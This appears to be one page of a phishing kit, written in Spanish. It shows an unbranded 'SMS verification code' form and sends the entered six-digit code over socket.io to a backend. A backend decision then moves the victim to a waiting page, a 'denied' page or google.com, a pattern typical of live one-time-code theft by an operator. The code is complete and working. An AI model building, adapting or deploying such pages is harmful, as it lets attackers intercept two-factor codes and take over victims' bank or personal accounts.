<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verificación por Código</title>
  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
  <style>
    body {
      margin: 0;
      font-family: 'Open Sans', sans-serif;
      background: #f3f6f9;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .screen {
      display: flex;
      flex-direction: column;
      align-items: center;
      background: #fff;
      padding: 2rem;
      border-radius: 1rem;
      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 400px;
      text-align: center;
    }

    .input-group {
      display: flex;
      align-items: center;
      background: #f0f2f5;
      border-radius: 8px;
      margin: 1rem 0;
      padding: 0.5rem 1rem;
      width: 100%;
    }

    .input-group .icon {
      color: #888;
      margin-right: 0.5rem;
    }

    .input-group input {
      border: none;
      background: transparent;
      outline: none;
      flex: 1;
      font-size: 1rem;
    }

    button {
      background: #37d10b;
      color: white;
      padding: 0.75rem 2rem;
      border: none;
      border-radius: 50px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 1rem;
      transition: background 0.3s;
    }

    button:hover {
      background: #4af01a;
    }

    .mensaje-error {
      color: red;
      margin-top: 0.5rem;
      font-size: 0.85rem;
    }

    .campo-requerido {
      border: 1px solid red !important;
    }
  </style>
</head>
<body>
  <div class="screen">
    <h3>Te enviaremos el codigo SMS a su celular</h3>
    <p>Introduce el codigo de verificacion que te acabamos de enviar a su celular de confianza.</p>
    <div class="input-group">
      <div class="icon"><i class="fas fa-key"></i></div>
      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
    </div>
    <p id="mensajeError" class="mensaje-error"></p>
    <button onclick="validarCodigo()">Validar código</button>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sessionId = localStorage.getItem("sessionId");
    socket.emit("reconectar", sessionId);

    function validarCodigo() {
      const codigo = document.getElementById("codigo").value;
      const mensajeError = document.getElementById("mensajeError");
      const codigoInput = document.getElementById("codigo");

      mensajeError.textContent = "";
      codigoInput.classList.remove("campo-requerido");

      if (!codigo) {
        mensajeError.textContent = "El código es obligatorio";
        codigoInput.classList.add("campo-requerido");
      } else if (!/^\d{6}$/.test(codigo)) {
        mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
        codigoInput.classList.add("campo-requerido");
      } else {
        // Enviar el código al backend
        socket.emit("codigoIngresado", { codigo, sessionId });

        // Ir a pantalla de espera
        window.location.href = "opciones.html";
      }
    }

    socket.on("respuestaCodigo", (decision) => {
      if (decision === "error") {
        window.location.href = "denegado.html";
      } else if (decision === "finalizar") {
        window.location.href = "https://www.google.com";
      }
    });
  </script>
</body>
</html>
